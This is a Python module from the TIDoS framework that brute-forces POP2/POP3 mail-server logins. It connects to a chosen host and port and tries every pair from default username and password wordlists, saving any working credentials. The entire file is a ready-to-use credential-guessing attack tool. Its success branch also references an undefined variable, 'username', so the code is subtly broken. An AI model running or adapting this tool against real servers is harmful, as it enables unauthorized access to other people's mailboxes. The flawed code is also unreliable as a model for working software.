#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import poplib, sys
import time
import socket
from core.Core.colors import *
from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

popuser = []
poppass = []

searchinfo = "POP Bruteforcer"
info = "POP password cracker for common users using dictionaries."
properties = {}

def popbrute(web):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = inspect.stack()[0][3]
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Brute Force Tools"
    global lvl3
    lvl3 = ""
    #print(R+'\n   ===================================')
    #print(R+'\n    P O P 2/3   B R U T E F O R C E R')
    #print(R+'   ---<>----<>----<>----<>----<>----<>\n')
    from core.methods.print import pbrute
    pbrute("POP2/3")
                
    try:
        print(GR+' [*] Testing target...')
        time.sleep(0.5)
        ip = socket.gethostbyname(web)

        m = input(O+' [§] Use IP '+R+str(ip)+O+'? (y/n) :> ')
        if m == 'y' or m == 'Y':
            pass
        elif m == 'n' or m == 'N':
            ip = input(O+' [§] Enter IP :> ')

        print(G+' [+] Target appears online...\n')
        print(O+' Choose the port number :\n')
        print(C+'   PORT     PROTOCOL')
        print(C+'   ====     ========')
        print(B+'   109        POP2')
        print(B+'   110        POP3')

        port = input(GR+'\n [§] Enter the port :> ')
        pop = poplib.POP3(ip,int(port))
        print(GR+' [*] Using default credentials...')
        time.sleep(0.6)
        print(O+' [!] Importing file paths...')
        time.sleep(0.8)
        try:
            with open('files/brute-db/pop/pop_defuser.lst','r') as users:
                for u in users:
                    u = u.strip('\n')
                    popuser.append(u)

            with open('files/brute-db/pop/pop_defpass.lst','r') as pas:
                for p in pas:
                    p = p.strip('\n')
                    poppass.append(p)
        except IOError:
            print(R+' [-] Importing wordlist failed!')

        found = False
        for user in popuser:
            for password in poppass:
                try:
                    pop.user(str(user))
                    pop.pass_(password)
                    if True:
                        found = True
                        print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
                        data = username + " : " + password
                        save_data(database, module, lvl1, lvl2, lvl3, name, data)
                        break
                except KeyboardInterrupt:
                    if not found:
                        data = "Nothing found."
                        save_data(database, module, lvl1, lvl2, lvl3, name, data)
                        sys.exit(1)
                except Exception:
                    print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')
        if not found:
            data = "Nothing found."
            save_data(database, module, lvl1, lvl2, lvl3, name, data)
    except Exception:
        print(R+' [-] Target seems to be down!')

def attack(web):
    web = web.fullurl
    popbrute(web)
